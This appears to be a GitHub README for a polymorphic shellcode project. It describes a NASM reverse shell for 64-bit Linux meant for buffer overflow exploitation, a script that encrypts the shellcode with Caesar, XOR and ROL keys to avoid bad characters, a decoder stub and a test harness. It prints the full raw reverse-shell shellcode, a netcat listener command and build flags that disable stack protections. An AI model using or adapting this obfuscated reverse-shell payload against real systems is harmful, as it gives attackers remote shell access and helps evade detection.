# Polymorphic shellcode

## Reverse shell

The `reverseShell.asm` file is a NASM reverse shell for 64-bit Linux. It is the payload and grants us, during buffer overflow operation, shell access to the remote machine from our attack machine.

N.B.: We have to think about changing the `127.1.10.100` IP address to the IP address of the attack machine.

### Testing the correct functioning of the reverse shell

Compile the file using the following commands:
```
nasm -f elf64 reverseShell.asm
ld reverseShell.o -o reverseShell
```

Open the socket indicated in the program on your machine :
```
nc -l 127.1.10.100 31337 -v
```

Run the program :
```
/reverseShell
```

You should get a shell on your port with the rights of the user with whom you started the program.

## Shellcode ciphering

The `cipherShellcode.py` file is a program for encrypting the shellcode representing the `reverseShell.asm` program.

Usage :
```
./cipherShellcode.py --shellcode \x68\x7f\x01\x0a\x64\x66\x68\x7a\x69\x66\x6a\x02\x48\x31\xd2\x48\x31\xf6\x40\xb6\x01\x48\x31\xff\x40\xb7\x02\x48\x31\xc0\xb0\x29\x0f\x05\x48\x31\xd2\xb2\x11\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x31\xd2\x48\x8d\x3c\x24\x48\x31\xc0\xb0\x3b\x0f\x05 --cesarKey1 13 --XOR 7 --cesarKey2 18 --ROL1 3 --ROL2 5
```

N.B.: You can change the keys as you wish and use another shellcode as well. If a badchar is detected, this will be indicated and it will be enough to change one or more keys until you have a functional combination.

## Shellcode deciphering

The `decipherShellcode.asm` file is a NASM program for 64-bit Linux. It allows you to decrypt the encrypted shellcode.

N.B.: Note that if you change the keys in the encryption program you will also have to change the keys in this program.

Unlike the assembler code in our reverse shell, we won't be able to execute this code. Or more precisely, we will be able to, but it will generate a segfault since we don't have our encrypted shellcode on the stack.

## Shellcode testing

The `testShellcode.c` file is a program for testing the proper functioning of the final shellcode, which is the concatenation of the encrypted shellcode to the decoder shellcode.

### Testing the correct functioning of the final shellcode

Compile the file using the following command :
```
gcc -z execstack -fno-stack-protector -fno-pie -z norelro -fPIC testShellcode.c -o testShellcode
```

Open the socket indicated in the program on your machine :
```
nc -l 127.1.10.100 31337 -v
```

Run the program :
```
./testShellcode
```

You should get a shell on your port with the rights of the user with whom you started the program.

## Bonus

For a detailed explanation you can read the corresponding article on my blog : [https://nyxott.github.io/projects/shellcodepolymorphique](https://nyxott.github.io/projects/shellcodepolymorphique).

N.B.: The blog article is in French.
